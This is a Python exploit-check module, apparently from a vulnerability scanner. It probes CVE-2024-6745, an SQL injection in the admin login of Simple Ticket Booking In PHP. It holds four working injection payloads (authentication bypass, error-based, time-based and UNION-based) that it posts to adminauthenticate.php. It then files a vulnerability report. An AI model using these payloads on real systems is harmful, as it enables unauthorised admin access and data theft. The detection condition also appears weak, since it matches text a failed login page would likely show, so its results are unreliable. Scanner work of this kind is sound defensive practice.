"""Agent Asteroid implementation for CVE-2024-6745."""

import requests

from agent import definitions
from agent import exploits_registry

from ostorlab.agent.kb import kb
from ostorlab.agent.mixins import agent_report_vulnerability_mixin

VULNERABILITY_TITLE = "SQL Injection in Simple Ticket Booking In PHP"
VULNERABILITY_REFERENCE = "CVE-2024-6745"
VULNERABILITY_DESCRIPTION = (
    "A SQL injection vulnerability in 'adminauthenticate.php' of Simple Ticket Booking In PHP allows attackers "
    "to manipulate SQL queries via the 'email' parameter, potentially gaining unauthorized access."
)
DEFAULT_TIMEOUT = 30

PAYLOADS = [
    "email=-2616' OR 2047=2047#&password=admin123&login_submit=",
    "email=asdmin' OR (SELECT 2229 FROM(SELECT COUNT(*),CONCAT(0x716a7a6b71,(SELECT (ELT(2229=2229,1))),"
    "0x7176706271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- "
    "cDlE&password=admin123&login_submit=",
    "email=asdmin' AND (SELECT 4082 FROM (SELECT(SLEEP(5)))ooOg)-- DHwI&password=admin123&login_submit=",
    "email=asdmin' UNION ALL SELECT NULL,CONCAT(0x716a7a6b71,"
    "0x57616a50584e70676f7a6b4654687477784649747a716576706c50784e7049677459774357414641,0x7176706271),NULL,"
    "NULL,NULL,NULL,NULL,NULL,NULL,NULL-- rPiQ&password=admin123&login_submit=",
]


def _create_vulnerability(target: definitions.Target) -> definitions.Vulnerability:
    """
    Creates and returns a vulnerability object for SQL Injection in Simple Ticket Booking In PHP.

    Args:
        target (definitions.Target): The target to create the vulnerability for.

    Returns:
        definitions.Vulnerability: The created vulnerability object.
    """
    entry = kb.Entry(
        title=VULNERABILITY_TITLE,
        risk_rating="HIGH",
        short_description=VULNERABILITY_DESCRIPTION,
        description=VULNERABILITY_DESCRIPTION,
        references={
            "nvd.nist.gov": f"https://nvd.nist.gov/vuln/detail/{VULNERABILITY_REFERENCE}"
        },
        recommendation=(
            "Implement proper input validation and parameterized queries to mitigate SQL injection attacks. "
            "Update the 'adminauthenticate.php' script to handle user inputs securely."
        ),
        security_issue=True,
        privacy_issue=False,
        has_public_exploit=False,  # Change based on availability of POC
        targeted_by_malware=False,
        targeted_by_ransomware=False,
        targeted_by_nation_state=False,
    )
    technical_detail = f"{target.origin}/adminauthenticate.php is vulnerable to {VULNERABILITY_REFERENCE}, {VULNERABILITY_TITLE}"
    vulnerability = definitions.Vulnerability(
        entry=entry,
        technical_detail=technical_detail,
        risk_rating=agent_report_vulnerability_mixin.RiskRating.HIGH,
    )
    return vulnerability


@exploits_registry.register
class SimpleTicketBookingSQLInjectionExploit(definitions.Exploit):
    """
    CVE-2024-6745: SQL Injection in Simple Ticket Booking In PHP.
    """

    def accept(self, target: definitions.Target) -> bool:
        """
        Checks if the target is vulnerable to SQL Injection in Simple Ticket Booking In PHP.

        Args:
            target (definitions.Target): The target to check vulnerability for.

        Returns:
            bool: True if vulnerable, False otherwise.
        """
        try:
            response = requests.post(
                f"{target.origin}/adminauthenticate.php", timeout=DEFAULT_TIMEOUT
            )
            if (
                response.status_code == 200
                and "action ='adminauthenticate.php'" in response.text
            ):
                return True
            return False
        except requests.RequestException:
            return False

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """
        Checks for SQL Injection vulnerability in Simple Ticket Booking In PHP.

        Args:
            target (definitions.Target): The target to check vulnerability for.

        Returns:
            list[definitions.Vulnerability]: List of vulnerabilities found (empty if none).
        """
        vulnerabilities = []
        try:
            for payload in PAYLOADS:
                response = requests.post(
                    f"{target.origin}/adminauthenticate.php",
                    data=payload,
                    timeout=DEFAULT_TIMEOUT,
                )
                if response.status_code == 200 and "Admin Sign In" in response.text:
                    vulnerability = _create_vulnerability(target)
                    vulnerabilities.append(vulnerability)
            return vulnerabilities
        except requests.RequestException:
            return []

    def exploit(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """
        Exploits the SQL Injection vulnerability in Simple Ticket Booking In PHP.

        Args:
            target (definitions.Target): The target to exploit.

        Returns:
            list[definitions.Vulnerability]: List of vulnerabilities found (empty if none).
        """
        return self.check(target)
